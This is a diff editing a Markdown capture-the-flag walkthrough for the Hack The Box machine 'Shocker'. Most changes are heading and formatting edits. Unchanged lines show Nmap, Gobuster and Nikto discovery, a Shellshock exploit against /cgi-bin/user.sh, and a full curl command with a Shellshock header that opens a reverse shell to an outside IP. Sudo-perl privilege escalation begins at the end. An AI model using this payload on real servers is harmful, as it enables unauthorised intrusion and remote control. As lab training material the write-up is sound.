@@ -2,8 +2,8 @@
 IP address : 10.10.10.56\
 OS : Linux
 
-## Enumeration
-Firstly, let us enumerate all the open ports using ```Nmap```
+## Discovery
+Firstly, let us enumerate all the open ports using Nmap
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -13,15 +13,15 @@ Firstly, let us enumerate all the open ports using ```Nmap```
 nmap -sC -sV -A -p- -T4 10.10.10.56 -vv
 ```
 
-From the output of ```NMAP```, we are able to obtain the following information about the open ports:
+From the output of Nmap, we are able to obtain the following information about the open ports:
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 80	| http | Apache httpd 2.4.18 (Ubuntu) | Open |
 | 435	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | Open |
 
-## Discovery
-Firstly, we will try to visit the website to obtain some information about the website. However, there isn't much information that can be obtained from the website.
-Next, we try to enumerate the directory and files on the website using ```gobuster```.
+### Gobuster
+We will now try to visit the website to obtain some information about the website. However, there isn't much information that can be obtained from the website.
+Next, we try to enumerate the directory and files on the website using Gobuster
 ```
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt -e -k -t 50
@@ -52,8 +52,7 @@ http://10.10.10.56/server-status        (Status: 403) [Size: 299]
 ===============================================================
 
 ```
-What is special in the output of the ```gobuster``` is the presence of the ```cgi-bin``` directory which is normally used to store perl or compiled script files. So, next what we
-will do is to do enumeration for the ```/cgi-bin``` directory. Form the output, we have noticed that the ```/cgin-bin``` directory actually contains a ```user.sh``` file
+What is special in the output of the Gobuster is the presence of the ```cgi-bin``` directory which is normally used to store perl or compiled script files. So, next what we will do is to do enumeration for the ```/cgi-bin``` directory. Form the output, we have noticed that the ```/cgin-bin``` directory actually contains a ```user.sh``` file
 ```
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x .txt,.php,.pl,.cgi,.c,.sh -e -k -t 50
@@ -100,6 +99,8 @@ http://10.10.10.56/cgi-bin/user.sh              (Status: 200) [Size: 118]
 2021/08/14 15:06:40 Finished
 ===============================================================
 ```
+
+### Nikto
 We will just keep this ```/cgi-bin/user.sh``` file in mind for now and carry on with a `Nikto` scan, which detected that we are using an old version of ```Apache```.
 ```
 - Nikto v2.1.6
@@ -115,6 +116,9 @@ We will just keep this ```/cgi-bin/user.sh``` file in mind for now and carry on 
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
 ```
+
+## Exploit
+### Shell shock vulnerability
 With the information that we are using an outdated ```Apache``` webserver and the presence of a ```cgi-bin``` and a little hint from the box's name, we suspect that the box is vulnerable to ```shellshock``` vulnerability. So, now we will test a POC for shellshock.
 ```
 ┌──(kali㉿kali)-[~]
@@ -152,6 +156,8 @@ Now, we have successfully exfiltrated the ```/etc/passwd``` file which proved th
 ```
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.250/3000 0>&1'" http://10.10.10.56/cgi-bin/user.sh
 ```
+
+### Obtaining a reverse shell
 Afterwards, we would have successfully created a reverse shell and all that is left for us to do is to stabilize the shell
 ```
 ┌──(kali㉿kali)-[~]
@@ -168,7 +174,7 @@ stty cols 132 rows 34
 shelly@Shocker:/usr/lib/cgi-bin$ 
 ```
 
-## Obtaining user flag
+### Obtaining user flag
 ```
 shelly@Shocker:/$ ls
 ls
@@ -189,7 +195,7 @@ cat user.txt
 <Redacted user flag>
 ```
 
-## Obtaining system flag
+### Obtaining system flag
 However, we are not done yet! We have not obtainted our system flag yet. To do so, let's first find the programs with root privileges using ```sudo -l```. From the output, we realized that /usr/bin/perl is able to execute root privileges without any password.
 ```
 shelly@Shocker:/home/shelly$ sudo -l
